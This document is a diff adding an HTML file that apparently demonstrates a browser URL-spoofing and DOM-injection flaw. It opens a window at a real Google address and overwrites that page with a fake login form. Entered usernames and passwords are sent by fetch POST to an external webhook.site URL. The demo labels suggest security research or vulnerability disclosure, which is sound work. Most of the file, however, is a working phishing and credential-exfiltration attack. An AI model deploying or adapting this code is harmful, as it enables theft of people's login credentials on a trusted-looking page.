@@ -1,0 +1,43 @@
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        function go() {
+            let x = window.open('https://www.google.com/csi');
+            setTimeout(function () {
+                const WEBHOOK_URL = "https://webhook.site/17955f89-5261-4f48-8e9a-be8463bbfb51"; // dummy webhook
+
+                x.document.body.innerHTML = `
+                    <h1>Spoofed Login</h1>
+                    <h1>Demo Login</h1>
+                    Username: <input id="username" placeholder="testuser"><br>
+                    Password: <input id="password" type="password" placeholder="password"><br>
+                    <button id="btnLogin">Login</button>
+                    <p id="status"></p>
+                `;
+
+                x.document.getElementById("btnLogin").onclick = function () {
+                    const username = x.document.getElementById('username').value;
+                    const password = x.document.getElementById('password').value;
+
+                    fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: JSON.stringify({ username, password, time: new Date().toISOString() })
+                    });
+
+                    x.document.getElementById("status").innerText = "Can interact with DOM";
+                    console.log("Data demo:", { username, password });
+                };
+            }, 500);
+        }
+    </script>
+
+    <style type="text/css" id="operaUserStyle"></style>
+</head>
+
+<body><button onclick="go()">Go</button>
+</body>
+
+</html>
